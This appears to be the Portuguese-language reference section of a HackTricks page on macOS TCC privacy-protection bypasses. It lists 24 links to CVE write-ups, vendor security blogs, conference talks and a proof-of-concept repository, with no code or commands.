- [1] [CVE-2020–9934: Contornando o framework Transparency, Consent, and Control (TCC) do macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Contornando as proteções de privacidade do TCC do macOS por acidente e intencionalmente](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Bypass do TCC Location Services (relatório original)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Onde está Carmen Sandiego: abusando do Location Services no macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: bypass do TCC rouba dados do iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (variáveis de ambiente SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Permitir o entitlement de variáveis de ambiente DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarização: o hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Bypass de TCC zero-day descoberto no malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "O que acontece no seu Mac fica no iCloud da Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nova vulnerabilidade do macOS, "powerdir", pode levar ao acesso não autorizado a dados do usuário](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Alterar o diretório home e contornar o TCC, também conhecido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Tocar música e contornar o TCC, também conhecido como CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Como roubar uma raposa (Firefox)](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Contornando o TCC com o Telegram no macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Descobrindo vulnerabilidades da Apple: auditoria de diskarbitrationd e storagekitd, parte 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks e CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Prova de conceito](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Definindo variáveis de ambiente no OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: bypass do TCC e escalada de privilégios com mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: bypass do TCC montando sobre o banco de dados do TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Mais de 20 maneiras de contornar os mecanismos de privacidade do macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Vitória arrasadora contra o TCC - Mais de 20 novas maneiras de contornar os mecanismos de privacidade do macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Do Spotlight ao Apple Intelligence — abusando de um 0day para roubar os dados que alimentam a IA do macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
